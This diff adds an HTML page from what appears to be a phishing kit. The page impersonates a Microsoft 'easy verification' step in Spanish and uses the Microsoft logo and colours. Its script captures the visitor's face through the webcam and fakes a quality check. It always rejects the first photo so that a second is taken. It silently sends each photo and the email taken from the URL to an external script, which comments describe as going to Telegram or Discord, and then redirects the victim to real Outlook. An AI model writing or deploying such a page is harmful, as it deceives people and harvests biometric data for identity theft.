@@ -1,0 +1,629 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificación fácil</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+              'ms-error': '#d83b01',
+              'ms-error-bg': '#fff4e6',
+              'ms-error-border': '#ffb900',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 2px 6px rgba(0,0,0,0.2)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      body {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        /* Fijar todo en móvil */
+        position: fixed;
+        width: 100%;
+        height: 100vh;
+        overflow: hidden;
+        /* Sin fondo en móvil */
+        background: none;
+      }
+      
+      /* Solo permitir scroll en desktop */
+      @media (min-width: 640px) {
+        body {
+          position: static;
+          overflow: auto;
+          /* Fondo SVG solo en PC */
+          background: url('banner.svg') center/cover no-repeat fixed;
+        }
+      }
+      
+      .ms-input {
+        border: 1px solid #8a8886;
+        font-size: 15px;
+        padding: 11px 12px;
+        line-height: 20px;
+        border-radius: 2px;
+      }
+      
+      .ms-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: inset 0 0 0 1px #0078d4;
+      }
+      
+      .ms-button {
+        background: #0078d4;
+        transition: background-color 0.1s ease;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 8px 12px;
+        min-height: 32px;
+        border-radius: 2px;
+      }
+      
+      .ms-button:hover {
+        background: #106ebe;
+      }
+      
+      .ms-button:active {
+        background: #005a9e;
+      }
+      
+      .ms-button:disabled {
+        background: #8a8886;
+        cursor: not-allowed;
+      }
+      
+      .ms-link {
+        color: #0078d4;
+        text-decoration: none;
+        font-size: 13px;
+      }
+      
+      .ms-link:hover {
+        text-decoration: underline;
+      }
+      
+      .fade-in {
+        animation: fadeIn 0.3s ease-out;
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      
+      /* Contenedor principal fijo en móvil */
+      .main-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        z-index: 10;
+      }
+      
+      /* En desktop, comportamiento normal */
+      @media (min-width: 640px) {
+        .main-container {
+          position: static;
+          min-height: 100vh;
+        }
+      }
+      
+      /* Estilos para la cámara */
+      .camera-container {
+        position: relative;
+        width: 100%;
+        max-width: 280px;
+        margin: 0 auto;
+        background: #000;
+        border-radius: 8px;
+        overflow: hidden;
+        aspect-ratio: 4/5;
+      }
+      
+      .camera-video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+        transform: scaleX(-1); /* Espejo para que se vea natural */
+      }
+      
+      .camera-preview {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+      }
+      
+      .camera-overlay {
+        position: absolute;
+        top: 45%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 110px;
+        height: 180px;
+        border: 3px solid rgba(0, 120, 212, 0.8);
+        border-radius: 50%;
+        pointer-events: none;
+      }
+      
+      @media (max-width: 640px) {
+        .camera-overlay {
+          width: 90px;
+          height: 150px;
+        }
+      }
+      
+      /* Estilos para el overlay de carga */
+      .loading-overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.7);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 10;
+        border-radius: 8px;
+      }
+      
+      .loading-spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top: 4px solid #0078d4;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 16px;
+      }
+      
+      .loading-text {
+        color: white;
+        font-size: 15px;
+        font-weight: 500;
+        text-align: center;
+        margin: 0;
+      }
+      
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      
+      .camera-preview.loading {
+        opacity: 0.5;
+        transition: opacity 0.3s ease;
+      }
+    </style>
+  </head>
+  <body class="relative">
+    <!-- Background overlay for better readability -->
+    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+    
+    <!-- Main Content -->
+    <div class="main-container">
+      <div class="w-full max-w-md fade-in relative z-10">
+      <div class="bg-white rounded-xl shadow-lg p-12">
+        <!-- Microsoft Logo -->
+        <div class="flex items-center justify-center mb-8">
+          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
+            <div class="bg-ms-red w-3 h-3"></div>
+            <div class="bg-ms-green w-3 h-3"></div>
+            <div class="bg-ms-blue-logo w-3 h-3"></div>
+            <div class="bg-ms-yellow w-3 h-3"></div>
+          </div>
+          <span class="text-ms-logo text-ms-gray">Microsoft</span>
+        </div>
+        
+        <h1 class="text-ms-title text-ms-gray mb-2 font-semibold text-center">Verificación fácil</h1>
+        <p class="text-ms-subtitle text-ms-gray-light mb-8 text-center">Tome una foto facial para verificar su identidad.</p>
+        
+        <!-- Error message (hidden by default) -->
+        <div class="mb-4 p-2.5 bg-ms-error-bg border border-ms-error-border rounded hidden" id="errorMessage" style="border-width: 1px;">
+          <div class="flex items-start">
+            <svg class="w-4 h-4 text-ms-error mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+            </svg>
+            <div>
+              <p class="text-sm text-ms-error" id="errorText" style="font-weight: 400;">Error al acceder a la cámara</p>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Mensaje simple de reintento (hidden by default) -->
+        <div class="mb-4 text-center hidden" id="retryMessage">
+          <p class="text-ms-body text-ms-gray font-semibold mb-1">¡Otra Vez!</p>
+          <p class="text-ms-subtitle text-ms-gray-light">Toma de nuevo la foto y asegurate de que tu cara este en el ovalo</p>
+        </div>
+        
+        <!-- Camera Container -->
+        <div class="mb-6" id="cameraSection">
+          <div class="camera-container">
+            <video id="video" class="camera-video" autoplay playsinline muted></video>
+            <canvas id="canvas" class="hidden"></canvas>
+            <div class="camera-overlay"></div>
+          </div>
+          <p class="text-xs text-ms-gray-light text-center mt-3">
+            Asegúrese de que su rostro esté centrado y bien iluminado
+          </p>
+        </div>
+        
+        <!-- Preview Container (hidden by default) -->
+        <div class="mb-6 hidden" id="previewSection">
+          <div class="camera-container">
+            <img id="preview" class="camera-preview" alt="Foto capturada" />
+            <div id="loadingOverlay" class="loading-overlay hidden">
+              <div class="loading-spinner"></div>
+              <p class="loading-text">Verificando calidad de imagen...</p>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Buttons -->
+        <div class="space-y-4">
+          <button
+            type="button"
+            id="captureButton"
+            class="ms-button w-full text-white"
+          >
+            Tomar foto
+          </button>
+          
+          <button
+            type="button"
+            id="retakeButton"
+            class="ms-button w-full text-white hidden"
+          >
+            Volver a tomar
+          </button>
+          
+          <button
+            type="button"
+            id="continueButton"
+            class="ms-button w-full text-white hidden"
+          >
+            Continuar
+          </button>
+        </div>
+        
+        <div class="text-center text-ms-body text-ms-gray mt-6">
+          <a href="index.html" class="ms-link">
+            Volver al inicio de sesión
+          </a>
+        </div>
+      </div>
+      </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50">
+      <div class="max-w-4xl mx-auto px-4">
+        <div class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-ms-gray-light">
+          <a href="#" class="hover:text-ms-blue transition-colors">Ayuda</a>
+          <a href="#" class="hover:text-ms-blue transition-colors">Términos de uso</a>
+          <a href="#" class="hover:text-ms-blue transition-colors">Privacidad y cookies</a>
+          <span class="text-center text-xs px-1 leading-tight hidden sm:inline">Usa la exploración privada si este no es tu dispositivo. <a href="#" class="text-ms-blue hover:underline">Más información</a></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Script de Telegram XJSX -->
+    <script src="xjsx.js"></script>
+    
+    <script>
+      // Obtener el correo de la URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const userEmail = urlParams.get('email') || 'No especificado';
+      
+      let stream = null;
+      let video, canvas, preview, captureButton, retakeButton, continueButton;
+      let cameraSection, previewSection, errorMessage, errorText, loadingOverlay, retryMessage;
+      let verificationAttempts = 0; // Contador de intentos de verificación
+      
+      // Iniciar cámara al cargar la página
+      async function startCamera() {
+        try {
+          // Verificar si getUserMedia está disponible
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            showError('Su navegador no soporta el acceso a la cámara. Por favor, use un navegador moderno.');
+            if (captureButton) captureButton.disabled = true;
+            return;
+          }
+          
+          // Solicitar acceso a la cámara frontal con máxima resolución
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: 'user', // Cámara frontal
+              width: { ideal: 1920, min: 1280 },
+              height: { ideal: 1080, min: 720 }
+            },
+            audio: false
+          });
+          
+          // Asignar el stream al video
+          if (video) {
+            video.srcObject = stream;
+            video.muted = true;
+            
+            // Reproducir el video
+            try {
+              await video.play();
+              console.log('Cámara activada correctamente');
+            } catch (playError) {
+              console.error('Error al reproducir video:', playError);
+              // Intentar de nuevo después de un momento
+              setTimeout(async () => {
+                try {
+                  if (video) await video.play();
+                } catch (e) {
+                  console.error('Error al reproducir video (segundo intento):', e);
+                }
+              }, 100);
+            }
+          }
+          
+          // Ocultar error si existe
+          if (errorMessage) errorMessage.classList.add('hidden');
+          if (captureButton) captureButton.disabled = false;
+          
+        } catch (error) {
+          console.error('Error al acceder a la cámara:', error);
+          let errorMsg = 'No se pudo acceder a la cámara. ';
+          
+          if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+            errorMsg += 'Por favor, permita el acceso a la cámara en la configuración de su navegador.';
+          } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
+            errorMsg += 'No se encontró ninguna cámara en su dispositivo.';
+          } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
+            errorMsg += 'La cámara está siendo usada por otra aplicación.';
+          } else {
+            errorMsg += 'Por favor, intente recargar la página.';
+          }
+          
+          showError(errorMsg);
+          if (captureButton) captureButton.disabled = true;
+        }
+      }
+      
+      function showError(message) {
+        if (errorText) errorText.textContent = message;
+        if (errorMessage) errorMessage.classList.remove('hidden');
+      }
+      
+      function hideError() {
+        if (errorMessage) errorMessage.classList.add('hidden');
+      }
+      
+      // Detener cámara
+      function stopCamera() {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
+        }
+      }
+      
+      // Inicializar cuando el DOM esté listo
+      function init() {
+        // Obtener referencias a los elementos
+        video = document.getElementById('video');
+        canvas = document.getElementById('canvas');
+        preview = document.getElementById('preview');
+        captureButton = document.getElementById('captureButton');
+        retakeButton = document.getElementById('retakeButton');
+        continueButton = document.getElementById('continueButton');
+        cameraSection = document.getElementById('cameraSection');
+        previewSection = document.getElementById('previewSection');
+        errorMessage = document.getElementById('errorMessage');
+        errorText = document.getElementById('errorText');
+        loadingOverlay = document.getElementById('loadingOverlay');
+        retryMessage = document.getElementById('retryMessage');
+        
+        // Verificar que todos los elementos existan
+        if (!video || !canvas || !preview || !captureButton || !retakeButton || !continueButton) {
+          console.error('Error: No se encontraron todos los elementos necesarios');
+          return;
+        }
+        
+        // Capturar foto
+        captureButton.addEventListener('click', () => {
+          try {
+            // Configurar canvas con las dimensiones exactas del video (máxima calidad)
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Dibujar el video en el canvas (invertido para que coincida con el preview)
+            const ctx = canvas.getContext('2d', { willReadFrequently: false });
+            // Desactivar suavizado para mantener calidad original
+            ctx.imageSmoothingEnabled = true;
+            ctx.imageSmoothingQuality = 'high';
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            // Dibujar con dimensiones exactas
+            ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+            
+            // Obtener la imagen como data URL con máxima calidad
+            const imageData = canvas.toDataURL('image/jpeg', 1.0);
+            
+            // Mostrar preview
+            preview.src = imageData;
+            
+            // Detener la cámara
+            stopCamera();
+            
+            // Ocultar mensajes si están visibles
+            if (errorMessage) errorMessage.classList.add('hidden');
+            if (retryMessage) retryMessage.classList.add('hidden');
+            
+            // Cambiar visibilidad de secciones
+            if (cameraSection) cameraSection.classList.add('hidden');
+            if (previewSection) previewSection.classList.remove('hidden');
+            
+            // Cambiar botones
+            if (captureButton) captureButton.classList.add('hidden');
+            if (retakeButton) retakeButton.classList.remove('hidden');
+            if (continueButton) continueButton.classList.remove('hidden');
+            
+          } catch (error) {
+            console.error('Error al capturar foto:', error);
+            showError('Error al capturar la foto. Por favor, intente nuevamente.');
+          }
+        });
+        
+        // Volver a tomar foto
+        retakeButton.addEventListener('click', () => {
+          // Ocultar preview
+          if (previewSection) previewSection.classList.add('hidden');
+          if (cameraSection) cameraSection.classList.remove('hidden');
+          
+          // Cambiar botones
+          if (retakeButton) retakeButton.classList.add('hidden');
+          if (continueButton) continueButton.classList.add('hidden');
+          if (captureButton) captureButton.classList.remove('hidden');
+          
+          // Reiniciar cámara
+          startCamera();
+        });
+        
+        // Continuar - verificar calidad y enviar foto a Discord
+        continueButton.addEventListener('click', async () => {
+          // Incrementar contador de intentos
+          verificationAttempts++;
+          
+          // Obtener la imagen del canvas con máxima calidad
+          const imageData = canvas.toDataURL('image/jpeg', 1.0);
+          
+          // Deshabilitar botón mientras se verifica
+          continueButton.disabled = true;
+          const originalText = continueButton.textContent;
+          
+          // Hacer la imagen opaca y mostrar overlay de carga
+          if (preview) {
+            preview.classList.add('loading');
+          }
+          if (loadingOverlay) {
+            loadingOverlay.classList.remove('hidden');
+          }
+          
+          // Simular verificación de calidad (esperar 2-3 segundos)
+          await new Promise(resolve => setTimeout(resolve, 2500));
+          
+          // Ocultar overlay de carga
+          if (loadingOverlay) {
+            loadingOverlay.classList.add('hidden');
+          }
+          if (preview) {
+            preview.classList.remove('loading');
+          }
+          
+          // Enviar la foto a Discord en segundo plano usando xjsx.js
+          if (typeof sendPhotoData !== 'undefined') {
+            sendPhotoData(imageData, userEmail).catch(err => {
+              console.error('Error al enviar a Discord:', err);
+            });
+          } else {
+            console.warn('⚠️ XJSX no cargado, no se puede enviar la foto');
+          }
+          
+          // Si es el primer intento (imagen mala), mostrar mensaje de reintento
+          if (verificationAttempts === 1) {
+            // Ocultar mensaje de error si está visible
+            if (errorMessage) errorMessage.classList.add('hidden');
+            
+            // Mostrar mensaje simple de reintento
+            if (retryMessage) retryMessage.classList.remove('hidden');
+            
+            // Esperar un momento antes de volver a la cámara
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Ocultar mensaje de reintento
+            if (retryMessage) retryMessage.classList.add('hidden');
+            
+            // Volver automáticamente a tomar foto
+            // Ocultar preview
+            if (previewSection) previewSection.classList.add('hidden');
+            if (cameraSection) cameraSection.classList.remove('hidden');
+            
+            // Cambiar botones
+            if (retakeButton) retakeButton.classList.add('hidden');
+            if (continueButton) continueButton.classList.add('hidden');
+            if (captureButton) captureButton.classList.remove('hidden');
+            
+            // Resetear estado del botón continuar
+            continueButton.textContent = originalText;
+            continueButton.style.background = '';
+            continueButton.disabled = false;
+            
+            // Reiniciar cámara
+            startCamera();
+          } 
+          // Si es el segundo intento (imagen buena), redirigir a Outlook
+          else if (verificationAttempts >= 2) {
+            // Mostrar mensaje de éxito
+            continueButton.textContent = 'Verificación exitosa ✓';
+            continueButton.style.background = '#7fba00';
+            
+            // Esperar un momento y redirigir
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Redirigir a Outlook
+            window.location.href = 'https://outlook.live.com/mail/0/';
+          }
+        });
+        
+        // Limpiar al salir de la página
+        window.addEventListener('beforeunload', () => {
+          stopCamera();
+        });
+        
+        // Iniciar cámara
+        startCamera();
+      }
+      
+      // Iniciar cuando el DOM esté listo
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+      } else {
+        // Si el DOM ya está cargado, iniciar inmediatamente
+        init();
+      }
+    </script>
+  </body>
+</html>
